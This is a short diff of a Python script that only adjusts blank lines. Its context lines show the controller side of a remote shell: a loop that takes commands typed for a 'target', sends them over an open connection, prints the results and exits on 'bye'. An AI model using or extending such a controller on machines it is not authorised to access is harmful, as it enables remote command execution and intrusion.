@@ -12,7 +12,6 @@ print('Connection established with ' + str(address[0]) + ' on port ' + str(addre
 while True:
     cmd = input('Enter command to execute on target:')
     if cmd != 'bye':
-
         cmd = str(cmd).encode('utf-8')
         connection.send(cmd)
         result = connection.recv(1024)
@@ -22,6 +21,7 @@ while True:
         print('Exit call received, closing connection')
         s.close()
         sys.exit()
+
     
 
 
